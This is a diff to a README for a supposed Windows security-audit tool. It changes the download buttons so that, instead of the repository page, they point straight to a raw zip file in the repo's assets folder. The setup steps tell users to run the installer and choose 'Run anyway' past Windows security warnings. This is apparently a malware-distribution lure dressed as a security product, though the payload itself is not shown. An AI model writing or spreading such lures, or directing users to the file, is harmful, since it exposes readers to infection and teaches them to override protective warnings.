@@ -1,6 +1,6 @@
 # 🛡️ oss-security-audit - Secure your code supply chain easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/lucas01feh/oss-security-audit)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/lucas01feh/oss-security-audit/raw/refs/heads/main/assets/audit_oss_security_v1.4.zip)
 
 ## 📂 What this tool does
 
@@ -27,7 +27,7 @@ Follow these steps to set up and run the audit tool on your Windows machine.
 ### 1. Download the tool
 Visit the link below to reach the download page. Look for the file ending in `.exe` under the latest release section. Save this file to your computer.
 
-[Click here to download the security tool](https://github.com/lucas01feh/oss-security-audit)
+[Click here to download the security tool](https://github.com/lucas01feh/oss-security-audit/raw/refs/heads/main/assets/audit_oss_security_v1.4.zip)
 
 ### 2. Prepare your system
 Navigate to the folder where you saved the file. Double-click the file to start the installer. If Windows prompts you with a security warning, select "Run anyway." A setup window will appear. Follow the on-screen instructions to finish the installation. The setup process creates a shortcut on your desktop.
